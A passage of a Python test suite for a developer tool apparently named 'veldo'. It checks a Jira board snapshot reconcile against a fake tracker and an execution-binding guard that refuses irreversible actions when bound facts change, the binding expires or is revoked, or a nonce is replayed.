       and (_p0612_fm.get("protected_paths") or []) == [])
expect("WARP-0612 dogfood: placement [tracker] with a footprint, behavior_bearing with observability",
       _p0612_fm.get("placement") == ["tracker"] and _p0612_fm.get("footprint")
       and _p0612_fm.get("behavior_bearing") == "true" and isinstance(_p0612_fm.get("observability"), dict))
# WARP-0612 is added to the tracker AREA of the architecture contract (the new module belongs there).
expect("WARP-0612 dogfood: the new module is declared in the tracker area of the architecture contract",
       ".veldo/tracker_jira_init.py" in (ROOT / ".veldo/architecture.yaml").read_text())
# WARP-0612 declares an ISSUE-TYPE provisioning acceptance criterion (AC7): types ensured/added, never
# a wrong-type fallback, idempotent - the founder directive "add types if missing, don't use wrong types".
_p0612_text = (ROOT / "specs/WARP-0612-jira-init-board-bootstrap.md").read_text()
expect("WARP-0612 dogfood: the spec declares an issue-type provisioning acceptance criterion (AC7)",
       re.search(r"id:\s*AC7", _p0612_text) and re.search(r"(?i)issue type", _p0612_text)
       and re.search(r"(?i)wrong type", _p0612_text))

# --- Jira board SNAPSHOT `veldo jira snapshot` (WARP-0613): the snapshot half of snapshot-then-subscribe -
# a one-way, idempotent reconcile that projects every plan's and spec's CURRENT DECLARED file status onto
# the board (a released plan -> shipped, a spec in review -> in_review, a standalone spec -> a top-level
# task), covering the two facts the event stream cannot carry and the standalone specs the event mirror
# skips. All proven over the deterministic FakeTracker offline (no network). Positive controls plus four
# in-memory source-mutation TEETH (each turns one load-bearing assertion RED, the module byte-unchanged).
_js_cfg = {"schema": "veldo.tracker/v1",
           "routing": {"mechanism": "label", "label_prefix": "veldo-repo:"},
           "status_map": {"ready": "Ready", "blocked": "Blocked", "in_review": "In Review", "shipped": "Shipped"},
           "repos": [{"id": "repo-a", "tracker": "jira", "project": "PROJ"}],
           "bootstrap": {"project_key": "PROJ", "issue_types": ["Epic", "Task"]}}
# Indices carrying: a released plan, a review spec under that plan, a STANDALONE review spec (no plan), an
# in_progress spec + an in_progress plan (declared status with NO VELDO mapping -> unset), and the reserved
# scaffold ids (PLAN-0000/WARP-0000) that must be filtered by _is_scaffold_id, never projected.
_js_specs = {
    "WARP-9701": {"id": "WARP-9701", "plan": "PLAN-0006", "work": "W1", "tracker_repo": "repo-a", "title": "a spec in review", "status": "review"},
    "WARP-9702": {"id": "WARP-9702", "plan": None, "tracker_repo": "repo-a", "title": "a standalone spec", "status": "review"},
    "WARP-9703": {"id": "WARP-9703", "plan": "PLAN-0006", "work": "W3", "tracker_repo": "repo-a", "title": "an in-progress spec", "status": "in_progress"},
    "WARP-0000": {"id": "WARP-0000", "plan": None, "tracker_repo": "repo-a", "title": "the spec template", "status": "review"},
}
_js_plans = {
    "PLAN-0006": {"id": "PLAN-0006", "title": "a released plan", "tracker_repo": "repo-a", "status": "released",
                  "work": [{"item": "W1", "spec": "WARP-9701", "spec_status": "review"}, {"item": "W3", "spec": "WARP-9703", "spec_status": "in_progress"}]},
    "PLAN-0007": {"id": "PLAN-0007", "title": "an in-progress plan", "tracker_repo": "repo-a", "status": "in_progress", "work": []},
    "PLAN-0000": {"id": "PLAN-0000", "title": "the plan template", "tracker_repo": "repo-a", "status": "released", "work": []},
}
_js_specs_json0 = json.dumps(_js_specs, sort_keys=True)
_js_plans_json0 = json.dumps(_js_plans, sort_keys=True)

_js_ft = TA.FakeTracker()
_js_rep = JI.snapshot_from_repo(_js_ft, config=_js_cfg, spec_index=_js_specs, plan_index=_js_plans)

# AC3: the two facts the event stream cannot carry - a review spec projects to In Review, and a released
# plan projects its epic to Shipped (FILE_STATUS_TO_VELDO EXTENDS the mirror's SPEC_STATUS_TO_VELDO with both).
expect("jira snapshot AC3: a spec declared 'review' projects to the mapped In Review status (no lifecycle event carries this)",
       _js_ft.snapshot("child:PLAN-0006:W1")["status"] == "In Review")
expect("jira snapshot AC3: a plan declared 'released' projects its epic to the mapped Shipped status (the burn-down would not)",
       _js_ft.snapshot("epic:PLAN-0006")["status"] == "Shipped")

# AC4: a standalone spec (no plan) is a TOP-LEVEL task (find_child(None, sid)) under NO epic - the specs the
# event mirror skips entirely (no plan, so no epic to place the child under), never forced under a spurious epic.
expect("jira snapshot AC4: a standalone spec (no plan) becomes a top-level task under NO epic, counted standalone",
       _js_ft.find_child(None, "WARP-9702") is not None and _js_ft.find_epic("WARP-9702") is None and _js_rep["standalone"] == 1)

# AC2: a declared status with NO FILE_STATUS_TO_VELDO entry (in_progress) leaves the status UNSET - never an
# invented transition (NG4), the same guarantee the event mirror upholds.
expect("jira snapshot AC2: a declared status with no VELDO mapping (in_progress) leaves status UNSET (no invented transition)",
       _js_ft.snapshot("child:PLAN-0006:W3")["status"] is None and _js_ft.snapshot("epic:PLAN-0007")["status"] is None and _js_rep["unset"] == 2)

# AC2: the reserved scaffold ids (PLAN-0000 / WARP-0000) are filtered by _is_scaffold_id, never projected.
expect("jira snapshot AC2: the reserved scaffold plan/spec (PLAN-0000/WARP-0000) are never projected onto the board",
       _js_ft.find_epic("PLAN-0000") is None and _js_ft.find_child(None, "WARP-0000") is None)

# The report is honest and tracks the fixture (non-tautology): 2 epics + 3 children (1 standalone) created,
# 3 transitions (in_review x2 + shipped), 2 unset (the in_progress spec + the in_progress plan).
expect("jira snapshot: the report counts created/standalone/transitions/unset honestly (tracks the fixture)",
       _js_rep["epics_created"] == 2 and _js_rep["children_created"] == 3 and _js_rep["standalone"] == 1
       and _js_rep["transitions"] == 3 and _js_rep["unset"] == 2)

# AC5: IDEMPOTENT - a second run forks nothing, records no duplicate transition, leaves the board byte-
# identical; and it reports the objects REUSED (created 0), read off the side-effect-free find_epic/find_child.
_js_before = _js_ft.state_digest()
_js_rep2 = JI.snapshot_from_repo(_js_ft, config=_js_cfg, spec_index=_js_specs, plan_index=_js_plans)
expect("jira snapshot AC5: a second run forks nothing and leaves the board byte-identical (idempotent)",
       _js_ft.state_digest() == _js_before)
expect("jira snapshot AC4/AC5: the re-run reports every epic/child REUSED (created 0), off the side-effect-free finds",
       _js_rep2["epics_reused"] == 2 and _js_rep2["children_reused"] == 3
       and _js_rep2["epics_created"] == 0 and _js_rep2["children_created"] == 0 and _js_rep2["transitions"] == 0)

# AC5: ONE-WAY - the snapshot never mutates the spec/plan indices it reads (json byte-unchanged after both runs).
expect("jira snapshot AC5: the snapshot never mutates the spec/plan indices it reads (one-way)",
       json.dumps(_js_specs, sort_keys=True) == _js_specs_json0 and json.dumps(_js_plans, sort_keys=True) == _js_plans_json0)

# AC4: writes flow ONLY through the seam and the finds are side-effect-free - a read never grows the write
# audit, so the created-vs-reused report needs no second write.
_js_audit_ft = TA.FakeTracker()
JI.snapshot_from_repo(_js_audit_ft, config=_js_cfg, spec_index=_js_specs, plan_index=_js_plans)
_js_a0 = len(_js_audit_ft.writes())
_js_audit_ft.find_epic("PLAN-0006"); _js_audit_ft.find_child("PLAN-0006", "W1"); _js_audit_ft.find_child(None, "WARP-9702")
expect("jira snapshot AC4: find_epic/find_child are side-effect-free (the write audit does not grow)",
       len(_js_audit_ft.writes()) == _js_a0)

# AC1: GENERIC - a repo with no tracker config is a clean no-op (reconciled False), never an error; and the
# module hardcodes no company/board value (the WARP-0613 additions are covered by the module-wide grep).
expect("jira snapshot AC1: a repo with no tracker config is a clean no-op (reconciled False), never an error",
       JI.snapshot_from_repo(TA.FakeTracker(), config={}).get("reconciled") is False)
expect("jira snapshot AC1: the module hardcodes no company/board config value (Bcengi/Dejitech/atlassian host)",
       not re.search(r"(?i)bcengi|dejitech|\.atlassian\.net", (ROOT / ".veldo/tracker_jira_init.py").read_text()))

# AC6: wired as ONE command - `veldo jira snapshot` is a subcommand of the repo-only module bin/veldo already
# routes 'jira' to (bin/veldo UNCHANGED); --dry-run runs the whole reconcile over a FakeTracker (no network)
# and returns 0; a repo with no tracker config is a clean no-op (0).
with tempfile.TemporaryDirectory() as _jsd:
    (Path(_jsd) / ".veldo").mkdir()
    (Path(_jsd) / ".veldo" / "trackers.json").write_text(json.dumps(_js_cfg))
    expect("jira snapshot AC6: veldo jira snapshot --dry-run runs the whole reconcile over a fake and returns 0",
           JI.main(["snapshot", "--dry-run", "--repo-root", _jsd]) == 0)
    _jsd2 = Path(_jsd) / "empty"; _jsd2.mkdir()
    expect("jira snapshot AC6: a repo with no tracker config is a clean no-op (return 0)",
           JI.main(["snapshot", "--dry-run", "--repo-root", str(_jsd2)]) == 0)
_js_veldo = (ROOT / "bin/veldo").read_text()
expect("jira snapshot AC6: bin/veldo routes 'jira' to the repo-only module (snapshot dispatched inside main, bin/veldo unchanged)",
       '"jira"' in _js_veldo and "tracker_jira_init.py" in _js_veldo)
# init runs the snapshot as its FINAL step: bootstrap returns a 'snapshot' report block after provision + mirror.
_js_bft = TA.FakeTracker(); _js_bft.seed_project("PROJ", "company-managed")
_js_brep = JI.bootstrap(_js_bft, config=_js_cfg, read_events=lambda _p: [], spec_index=_js_specs, plan_index=_js_plans)
expect("jira snapshot AC6: veldo jira init runs provision, then event-mirror, then the snapshot reconcile (a 'snapshot' report block)",
       "provision" in _js_brep and "mirror" in _js_brep and _js_brep.get("snapshot", {}).get("reconciled") is True)

# --- WARP-0621 (W8 of PLAN-0016): the execution binding -------------------------------------
# AC1: SIX BOUND FACTS, EACH WITH ITS OWN NAMED REFUSAL, driven one at a time so no single leg
# can be carrying the others, and with the happy path beside them as the required control.
_EB_ARGS = dict(target="purge_stale_rows", system="fake-data-store", environment=_TK_ENV,
                parameters=_tk_params, state_digest=_TK_STATE, proposal_digest=_tk_dig,
                now=_TK_NOW)


def _eb_check(**over):
    a = dict(_EB_ARGS); a.update(over)
    return EB.check(_tk_binding(), **a)[0]


expect("WARP-0621 AC1 control: an unchanged binding is OK (the guard is not simply refusing everything)",
       _eb_check() == EB.BINDING_OK)
_eb_facts = {
    "target": (dict(target="restart_service"), EB.BINDING_TARGET_MISMATCH),
    "system": (dict(system="other-store"), EB.BINDING_SYSTEM_MISMATCH),
    "environment": (dict(environment="fake-staging"), EB.BINDING_ENVIRONMENT_MISMATCH),
    "parameters": (dict(parameters=dict(_tk_params, _extra="changed")), EB.BINDING_PARAMETERS_CHANGED),
    "state_digest": (dict(state_digest="state-digest-MOVED"), EB.BINDING_STATE_CHANGED),
    "proposal_digest": (dict(proposal_digest="0" * 64), EB.BINDING_PROPOSAL_CHANGED),
}
expect("WARP-0621 AC1: EVERY ONE of the six bound facts refuses with its OWN name when it no longer holds at execution",
       all(_eb_check(**_ov) == _want for _ov, _want in _eb_facts.values())
       and len(_eb_facts) == 6)
# and the roster cannot grow a fact with no check: BOUND_FACTS is the single declaration.
expect("WARP-0621 AC1: every fact in BOUND_FACTS is exercised above, so a seventh added without a check is a RED not a hole",
       set(EB.BOUND_FACTS) == set(_eb_facts))

# AC2: expiry and revocation end an authorisation.
expect("WARP-0621 AC2: past its expiry the binding refuses (an authorisation is a moment, not a standing permission)",
       _eb_check(now="2027-06-01T00:00:00Z") == EB.BINDING_EXPIRED)
expect("WARP-0621 AC2: a revoked binding refuses regardless of every other fact still holding",
       EB.check(_tk_binding(revoked=True), **_EB_ARGS)[0] == EB.BINDING_REVOKED)

# AC3: the nonce is spent exactly once, atomically, and a spent nonce is a NAMED replay refusal.
with tempfile.TemporaryDirectory() as _eb_store:
    _eb_first = EB.consume(_eb_store, "c" * 32)
    _eb_second = EB.consume(_eb_store, "c" * 32)
    expect("WARP-0621 AC3: of two callers racing one nonce exactly ONE wins (O_CREAT|O_EXCL, no lock and no daemon)",
           _eb_first is True and _eb_second is False)
    expect("WARP-0621 AC3: a check against an already-spent nonce refuses by NAME rather than silently",
           EB.check(_tk_binding(nonce="c" * 32), consumed=EB.spent(_eb_store), **_EB_ARGS)[0]
           == EB.BINDING_REPLAYED)

# AC4: at the SHIPPED EXECUTOR SURFACE, a risky action with no binding refuses. Fails closed, so
# the guard cannot be skipped by omitting an argument.
_eb_none = _tk_run(binding=None)
expect("WARP-0621 AC4: the executor REFUSES an irreversible action carrying no execution binding, even with both keys valid",
       _eb_none.get("executed") is False
       and _eb_none.get("refused") == AE.REFUSE_BINDING
       and _eb_none.get("binding_reason") == EB.BINDING_ABSENT)
# ... and the positive control at the same surface: with the binding it executes.
_eb_ok = _tk_run(fake=AE.FakeActionSystem())
expect("WARP-0621 AC4 control: the SAME risky action WITH a valid binding still executes (the guard blocks drift, not work)",
       _eb_ok.get("executed") is True and _eb_ok.get("refused") is None)
# ... and the nonce is spent BEFORE the run, so the second attempt on one authorisation refuses.
with tempfile.TemporaryDirectory() as _eb_st2:
    _eb_r1 = _tk_run(fake=AE.FakeActionSystem(), store=_eb_st2)
    _eb_r2 = _tk_run(fake=AE.FakeActionSystem(), store=_eb_st2)
    expect("WARP-0621 AC3/AC4: one authorisation executes ONCE end to end - the replay of the same nonce refuses at the executor",
           _eb_r1.get("executed") is True
           and _eb_r2.get("executed") is False
           and _eb_r2.get("binding_reason") == EB.BINDING_REPLAYED)

# AC5: THE REQUIRED NEGATIVE CONTROL. The reversible W6 path is untouched: no binding, no refusal.
_eb_rev = _ae_exec(fake=AE.FakeActionSystem()).execute(
    _ae_remedy, _wl, confirmation=_ae_conf(), now="2026-07-23T00:00:00Z")
expect("WARP-0621 AC5: a REVERSIBLE action still executes with NO binding supplied - the change is confined to the risky branch",
       _eb_rev.get("executed") is True and _eb_rev.get("refused") is None)

# AC6: the limit is in the code, so a later reader cannot delete the honesty and keep the guard.
_eb_doc = " ".join((EB.__doc__ or "").lower().split())
expect("WARP-0621 AC6: the module states it is NOT a forgery defense and says what it actually buys",
       "not a forgery defense" in _eb_doc
       and "an agent that can write the repository can write a binding record" in _eb_doc
       and "affirmative act" in _eb_doc)
